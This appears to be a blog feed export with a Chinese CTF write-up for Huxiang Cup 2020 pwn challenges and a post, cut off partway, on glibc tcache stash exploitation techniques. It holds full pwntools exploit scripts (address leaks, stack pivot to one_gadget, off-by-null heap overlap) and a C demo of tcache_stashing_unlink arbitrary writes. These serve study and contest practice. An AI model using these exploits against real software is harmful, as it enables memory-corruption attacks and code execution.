    <link href="http://chumen77.xyz/2020/11/04/%E6%B9%96%E6%B9%98%E6%9D%AFctf2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/11/04/湖湘杯ctf2020部分wp/</id>
    <published>2020-11-04T09:40:19.194Z</published>
    <updated>2020-11-04T11:57:15.684Z</updated>
    
    <content type="html"><![CDATA[<h1 id="湖湘杯ctf2020部分wp"><a href="#湖湘杯ctf2020部分wp" class="headerlink" title="湖湘杯ctf2020部分wp"></a>湖湘杯ctf2020部分wp</h1><h2 id="blend-pwn"><a href="#blend-pwn" class="headerlink" title="blend pwn"></a>blend pwn</h2><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf （del的函数）</li><li>fmt （show name 的函数）</li><li>后门函数存在栈溢出</li></ul><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>先用fmt泄漏出来栈地址 libc地址备用，然后发现只能申请2次的chunk，已经不能进行fastbin attack，只能泄漏一下heap地址，重点研究下后门函数。</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">backdoor</span><span class="hljs-params">()</span></span>&#123;  _QWORD *v0; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">char</span> v2; <span class="hljs-comment">// [rsp+10h] [rbp-20h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+28h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please input what you want:"</span>);  <span class="hljs-keyword">if</span> ( (<span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span>)read_diy(&amp;v2, <span class="hljs-number">0x28</span>) &gt; <span class="hljs-number">0x10</span> )  &#123;    v0 = (_QWORD *)_cxa_allocate_exception(<span class="hljs-number">8L</span>L, <span class="hljs-number">0x28</span>LL);    *v0 = <span class="hljs-string">"You are too young!"</span>;    _cxa_throw(v0, &amp;`typeinfo <span class="hljs-keyword">for</span>'<span class="hljs-keyword">char</span> <span class="hljs-keyword">const</span>*, <span class="hljs-number">0L</span>L);  &#125;  <span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v3;&#125;</code></pre></div><p>发现了存在8字节的栈溢出，可以溢出到rbp，但是此时已经破坏了canary。</p><p>去百度后发现<code>_cxa_allocate_exception</code>的妙用，覆盖好rbp后，其可以完成过canary的检测且可以配合上层函数的<code>leave ret</code>,完成一个栈迁移的效果。</p><p>参考链接：<br><a href="https://www.anquanke.com/post/id/89855#h3-8" target="_blank" rel="noopener">https://www.anquanke.com/post/id/89855#h3-8</a></p><p>所以就覆盖rbp为heap的地址，在上面存好one gadget 地址，ret 上去即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'47.111.104.169'</span>,<span class="hljs-number">55804</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex&gt;'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)sla(<span class="hljs-string">'name'</span>,<span class="hljs-string">'%p%p'</span>)sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)ru(<span class="hljs-string">'0x'</span>)stackbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)info_addr(<span class="hljs-string">'stackbase'</span>,stackbase)ru(<span class="hljs-string">'0x'</span>)libcbase = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x3c6780</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)one = libcbase + <span class="hljs-number">0x45226</span>add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)add(p64(<span class="hljs-number">0</span>) + p64(one)*<span class="hljs-number">6</span>)free(<span class="hljs-number">0</span>)free(<span class="hljs-number">1</span>)show()<span class="hljs-comment"># debug()</span>ru(<span class="hljs-string">'2:'</span>)heap = uu64(r(<span class="hljs-number">6</span>))info_addr(<span class="hljs-string">'heap'</span>,heap)sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'666'</span>)payload = <span class="hljs-string">'1'</span> * <span class="hljs-number">0x10</span> + p64(<span class="hljs-number">0</span>) * <span class="hljs-number">2</span> + p64(heap+<span class="hljs-number">0x90</span>)sa(<span class="hljs-string">':'</span>,str(payload))itr()</code></pre></div><h2 id="babyheap"><a href="#babyheap" class="headerlink" title="babyheap"></a>babyheap</h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>off by null</li><li>show free 函数存在负溢，idx没做检查</li></ul><h3 id="小难点"><a href="#小难点" class="headerlink" title="小难点"></a>小难点</h3><p><strong>prev size 无法被修改到。</strong></p><p>解决办法：</p><p>用unlink机制来解决问题，其在更新进入unsortbin堆块的next chunk 的prev size时，会写入刚刚unsortbin堆块的size，并且在每次分割unsortbin后，每个堆块的原本写入的prev size，并不会清除。</p><p>这就变相的实现了prev size的修改，利用这个残余数据完成攻击。</p><h4 id="Poc-（不考虑tcache的影响）"><a href="#Poc-（不考虑tcache的影响）" class="headerlink" title="Poc （不考虑tcache的影响）"></a>Poc （不考虑tcache的影响）</h4><div class="hljs"><pre><code class="hljs python">add() <span class="hljs-comment">#1</span>add() <span class="hljs-comment">#2</span>add() <span class="hljs-comment">#3</span>free(<span class="hljs-number">1</span>)free(<span class="hljs-number">2</span>)<span class="hljs-comment">#已经实现在chunk 3的prev size 写入了 0x200</span>free(<span class="hljs-number">3</span>)add() <span class="hljs-comment">#1</span>add() <span class="hljs-comment">#2</span>add() <span class="hljs-comment">#3</span><span class="hljs-comment"># 申请回来继续用</span>free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">2</span>,<span class="hljs-number">0xf8</span> * <span class="hljs-string">'1'</span>) <span class="hljs-comment">#fake 2 free过</span>free(<span class="hljs-number">3</span>)<span class="hljs-comment">#已经完成了overlap</span></code></pre></div><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babyheap'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">27411</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'1'</span>)<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,size,data)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))    sla(<span class="hljs-string">'ize:'</span>,str(size))    sa(<span class="hljs-string">':'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'dex'</span>,str(idx))show(<span class="hljs-number">-14</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>))  - <span class="hljs-number">0x3ec760</span>info_addr(<span class="hljs-string">'libcbase'</span>,libcbase)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">11</span>):    add()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(<span class="hljs-number">10</span>-i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">3</span>):    free(i)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):   add()add()add()add()<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):    free(i)free(<span class="hljs-number">8</span>)edit(<span class="hljs-number">9</span>,<span class="hljs-number">0xf8</span>,<span class="hljs-string">'\x01'</span> * <span class="hljs-number">0xf0</span>)free(<span class="hljs-number">10</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">7</span>):   add()add()add()free(<span class="hljs-number">9</span>)edit(<span class="hljs-number">10</span>,<span class="hljs-number">0x8</span>, p64(<span class="hljs-number">0x3ed8e8</span> + libcbase))add()add()edit(<span class="hljs-number">11</span>,<span class="hljs-number">0x8</span>,p64(rce18[<span class="hljs-number">1</span>] + libcbase))free(<span class="hljs-number">1</span>)itr()</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;湖湘杯ctf2020部分wp&quot;&gt;&lt;a href=&quot;#湖湘杯ctf2020部分wp&quot; class=&quot;headerlink&quot; title=&quot;湖湘杯ctf2020部分wp&quot;&gt;&lt;/a&gt;湖湘杯ctf2020部分wp&lt;/h1&gt;&lt;h2 id=&quot;blend-pwn&quot;&gt;&lt;a hre
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>glibc 2.29引入stash 机制后引起的相关漏洞学习</title>
    <link href="http://chumen77.xyz/2020/10/29/glibc%202.29%E5%BC%95%E5%85%A5stash%20%E6%9C%BA%E5%88%B6%E6%9C%BA%E5%88%B6%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    <id>http://chumen77.xyz/2020/10/29/glibc 2.29引入stash 机制机制相关漏洞学习/</id>
    <published>2020-10-29T08:15:08.329Z</published>
    <updated>2020-11-13T05:37:29.252Z</updated>
    
    <content type="html"><![CDATA[<h1 id="glibc-2-29引入stash-机制后引起的相关漏洞学习"><a href="#glibc-2-29引入stash-机制后引起的相关漏洞学习" class="headerlink" title="glibc 2.29引入stash 机制后引起的相关漏洞学习"></a>glibc 2.29引入stash 机制后引起的相关漏洞学习</h1><p>以下示例的libc源码均为libc2.31.</p><h2 id="fastbin的stash机制"><a href="#fastbin的stash机制" class="headerlink" title="fastbin的stash机制"></a>fastbin的stash机制</h2><p>这里分析一下对于fastbin的stash机制</p><div class="hljs"><pre><code class="hljs c"> <span class="hljs-keyword">if</span> ((<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(nb) &lt;= (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>)(get_max_fast())) <span class="hljs-comment">//size在fastbin范围内</span>  &#123;    idx = fastbin_index(nb);    mfastbinptr *fb = &amp;fastbin(av, idx);    mchunkptr pp;    victim = *fb;     <span class="hljs-keyword">if</span> (victim != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//如果有chunk</span>    &#123;      <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)        *fb = victim-&gt;fd; <span class="hljs-comment">//取出头chunk</span>      <span class="hljs-keyword">else</span>        REMOVE_FB(fb, pp, victim);       <span class="hljs-keyword">if</span> (__glibc_likely(victim != <span class="hljs-literal">NULL</span>))       &#123;        <span class="hljs-keyword">size_t</span> victim_idx = fastbin_index(chunksize(victim));        <span class="hljs-keyword">if</span> (__builtin_expect(victim_idx != idx, <span class="hljs-number">0</span>)) <span class="hljs-comment">//对fastbin的size检查</span>          malloc_printerr(<span class="hljs-string">"malloc(): memory corruption (fast)"</span>);        check_remalloced_chunk(av, victim, nb);  <span class="hljs-comment">//if USE_TCACHE，且看到此fastbin链表下，存在相同大小的bins（也就是一条chain），进行Stash。过程：把剩下的bins放入Tcache中</span>        <span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>        <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx(nb);        <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) <span class="hljs-comment">//如果属于tcache管辖范围</span>        &#123;          mchunkptr tc_victim;           <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks.  */</span>          <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = *fb) != <span class="hljs-literal">NULL</span>) <span class="hljs-comment">//只要tcache没满，并且fastbin还有chunk</span>          &#123;            <span class="hljs-keyword">if</span> (SINGLE_THREAD_P)  <span class="hljs-comment">//从fastbin中取出</span>              *fb = tc_victim-&gt;fd;            <span class="hljs-keyword">else</span>            &#123;              REMOVE_FB(fb, pp, tc_victim);              <span class="hljs-keyword">if</span> (__glibc_unlikely(tc_victim == <span class="hljs-literal">NULL</span>))                <span class="hljs-keyword">break</span>;            &#125;            tcache_put(tc_victim, tc_idx);<span class="hljs-comment">//放入tcache中</span>          &#125;        &#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>        <span class="hljs-keyword">void</span> *p = chunk2mem(victim);        alloc_perturb(p, bytes);        <span class="hljs-keyword">return</span> p;      &#125;    &#125;  &#125;</code></pre></div><p>也就是比如当一个线程申请0x50大小的chunk时，如果tcache没有，那么就会进入分配区进行处理，如果对应bin中存在0x50的chunk，除了取出并返回之外，ptmalloc会认为这个线程在将来还需要相同的大小的chunk，因此就会把对应bin中0x50的chunk尽可能的放入tcache的对应链表中去。</p><h3 id="Tcache-Stashing-遇上-fastbin-double-free"><a href="#Tcache-Stashing-遇上-fastbin-double-free" class="headerlink" title="Tcache Stashing  遇上 fastbin double free"></a>Tcache Stashing  遇上 fastbin double free</h3><p>假设有个double free可以触发，其用到fastbin上：<br>进行free 多次构成：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/G59EQi.png" srcset="/img/loading.gif" alt="1"></p><p>为了触发stash，先申请完tcache里的chunk，让其为空，（或者让其不满也可以）</p><p>然后再申请一下同size的chunk，就会触发stash。也是其精妙之处，在glibc2.27以下，往往是这样的构造：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/S4rab1.png" srcset="/img/loading.gif" alt="2"></p><p>主要由于fastbin 取出时，其会检查size是否相符合，导致很受限制。此时其基本就是可以攻击带有0x7f,去攻击libc上的内存。</p><p>但是有了stash这个机制，其就变成了以下的情况：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/68p4Vb.png" srcset="/img/loading.gif" alt="3"></p><p>由于上来申请同size的chunk时触发了stash机制，其会把fastbin里剩下的chunk放入到tcache中。由于chunk 7的fd是可以控制的，写入tag地址，然后放入chain的chunk ，也就是chunk 8 、7 、tag 。这就相当于劫持了tcache chain，可以实现任意地址写。</p><h3 id="相关例题"><a href="#相关例题" class="headerlink" title="相关例题"></a>相关例题</h3><ul><li>bytectf2020 gun</li><li>太湖杯 seven hero （libc2.29）</li></ul><h2 id="smallbin的stash机制"><a href="#smallbin的stash机制" class="headerlink" title="smallbin的stash机制"></a>smallbin的stash机制</h2><p>对于smallbin的stash机制：</p><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">if</span> (in_smallbin_range (nb))&#123;  idx = smallbin_index (nb);  bin = bin_at (av, idx); <span class="hljs-comment">//smallbin 从chain尾开始取到的chunk的fd位位 bin值 （根据 FIFO，即为最先放入的 Chunk）</span>  <span class="hljs-keyword">if</span> ((victim = last (bin)) != bin) <span class="hljs-comment">//victim 即为刚刚取到的chunk</span>&#123;  bck = victim-&gt;bk; <span class="hljs-comment">//获取倒数第二个chunk  </span>  <span class="hljs-keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim)) <span class="hljs-comment">//验证双向链表是否正常</span>malloc_printerr (<span class="hljs-string">"malloc(): smallbin double linked list corrupted"</span>);  set_inuse_bit_at_offset (victim, nb);  bin-&gt;bk = bck;  bck-&gt;fd = bin;  <span class="hljs-comment">//将 bin 的 bk 指向 victim 的后一个 Chunk，将 victim 后一个 Chunk 的 fd 指向 bin，即将 victim 取出</span>  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (victim);  check_malloced_chunk (av, victim, nb);<span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> USE_TCACHE</span>  <span class="hljs-comment">/* While we're here, if we see other chunks of the same size, stash them in the tcache.  */</span>  <span class="hljs-keyword">size_t</span> tc_idx = csize2tidx (nb); <span class="hljs-comment">//获取对应size的tcache索引</span>  <span class="hljs-keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)&#123;  mchunkptr tc_victim;  <span class="hljs-comment">/* While bin not empty and tcache not full, copy chunks over.  */</span>  <span class="hljs-keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (tc_victim = last (bin)) != bin)   <span class="hljs-comment">//#define last(b)      ((b)-&gt;bk)  也就是 tc_victim = bin-&gt;bk</span>&#123;  <span class="hljs-keyword">if</span> (tc_victim != <span class="hljs-number">0</span>)&#123;  bck = tc_victim-&gt;bk;  set_inuse_bit_at_offset (tc_victim, nb);  <span class="hljs-keyword">if</span> (av != &amp;main_arena)set_non_main_arena (tc_victim);  bin-&gt;bk = bck;  bck-&gt;fd = bin;  <span class="hljs-comment">//将 bin 的 bk 指向 tc_victim 的后一个 Chunk，将 tc_victim 后一个 Chunk 的 fd 指向 bin，即将 tc_victim 取出</span>  tcache_put (tc_victim, tc_idx);&#125;&#125;&#125;<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span></span>  <span class="hljs-keyword">void</span> *p = chunk2mem (victim);  alloc_perturb (p, bytes);  <span class="hljs-keyword">return</span> p;&#125;&#125;</code></pre></div><p>也就是在smallbin分配之后，如果smallbin链表中仍然存在堆块，并且对应的tcache list没有满chain的话，就会将small bin链表中所有的堆块放入到相应的tcache中。</p><p><strong>当然要发生这种分配的方式，必须要越过tcache优先分配堆块，calloc的分配是不从tcache bin里取chunk的，即可满足。</strong></p><p>下面跟着示例代码和glibc相关源码调试来学习一下：</p><h3 id="tcache-stashing-unlink"><a href="#tcache-stashing-unlink" class="headerlink" title="tcache_stashing_unlink"></a><code>tcache_stashing_unlink</code></h3><h4 id="示例代码"><a href="#示例代码" class="headerlink" title="示例代码"></a>示例代码</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;inttypes.h&gt;</span></span><span class="hljs-keyword">static</span> <span class="hljs-keyword">uint64_t</span> victim = <span class="hljs-number">0</span>;<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> **argv)</span></span>&#123;setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>);setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-number">0</span>);<span class="hljs-keyword">char</span> *t1;<span class="hljs-keyword">char</span> *s1, *s2, *pad;<span class="hljs-keyword">char</span> *tmp;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"You can use this technique to write a big number to arbitrary address instead of unsortedbin attack\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n1. need to know heap address and the victim address that you need to attack\n"</span>);tmp = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"victim's address: %p, victim's vaule: 0x%lx\n"</span>, &amp;victim, victim);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"heap address: %p\n"</span>, tmp<span class="hljs-number">-0x260</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n2. choose a stable size and free six identical size chunks to tcache_entry list\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Here, I choose the size 0x60\n"</span>);<span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, the tcache_entry[4] list is %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p --&gt; %p\n"</span>, t1, t1<span class="hljs-number">-0x60</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">2</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">3</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">4</span>, t1<span class="hljs-number">-0x60</span>*<span class="hljs-number">5</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n3. free two chunk with the same size like tcache_entry into the corresponding smallbin\n"</span>);<span class="hljs-comment">/* 将两个大小相同的块（如tcache_entry）释放到相应的smallbin中 */</span>s1 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk %p, whose size is beyond tcache size threshold\n"</span>, s1);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a padding chunk, avoid %p to merge to top chunk\n"</span>, s1);<span class="hljs-built_in">free</span>(s1);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Free chunk %p to unsortedbin\n"</span>, s1);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a calculated size, make the rest chunk size in unsortedbin is 0x60\n"</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Alloc a chunk whose size is larger than rest chunk size in unsortedbin, that will trigger chunk to other bins like smallbins\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Repeat the above steps, and free another chunk into corresponding smallbin\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"A little difference, notice the twice pad chunk size must be larger than 0x60, or you will destroy first chunk in smallbin[4]\n"</span>);s2 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x420</span>);pad = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x80</span>);<span class="hljs-built_in">free</span>(s2);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x100</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"chunk %p is in smallbin[4], whose size is 0x60\n"</span>, s2+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"smallbin[4] list is %p &lt;--&gt; %p\n"</span>, s2+<span class="hljs-number">0x3c0</span>, s1+<span class="hljs-number">0x3c0</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n4. overwrite the first chunk in smallbin[4]'s bk pointer to &amp;victim-0x10 address, the first chunk is smallbin[4]-&gt;fd\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Change %p's bk pointer to &amp;victim-0x10 address: 0x%lx\n"</span>, s2+<span class="hljs-number">0x3c0</span>, (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>);*(<span class="hljs-keyword">uint64_t</span>*)((s2+<span class="hljs-number">0x3c0</span>)+<span class="hljs-number">0x18</span>) = (<span class="hljs-keyword">uint64_t</span>)(&amp;victim)<span class="hljs-number">-0x10</span>;<span class="hljs-built_in">printf</span>(<span class="hljs-string">"\n5. use calloc to apply to smallbin[4], it will trigger stash mechanism in smallbin.\n"</span>);<span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Finally, the victim's value is changed to a big number\n"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Now, victim's value: 0x%lx\n"</span>, victim);<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;</code></pre></div><h4 id="编译命令"><a href="#编译命令" class="headerlink" title="编译命令"></a>编译命令</h4><div class="hljs"><pre><code class="hljs c">gcc  -g ./tcache_stashing_unlink.c -o tcache_stashing_unlink</code></pre></div><p>-g 编译是可以让gdb显示源码</p><h4 id="调试过程"><a href="#调试过程" class="headerlink" title="调试过程"></a>调试过程</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">for</span>(<span class="hljs-keyword">int</span> i=<span class="hljs-number">0</span>; i&lt;<span class="hljs-number">6</span>; i++)&#123;t1 = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-number">0x50</span>);<span class="hljs-built_in">free</span>(t1);&#125;</code></pre></div><div class="hljs"><pre><code class="hljs undefined">(0x60)   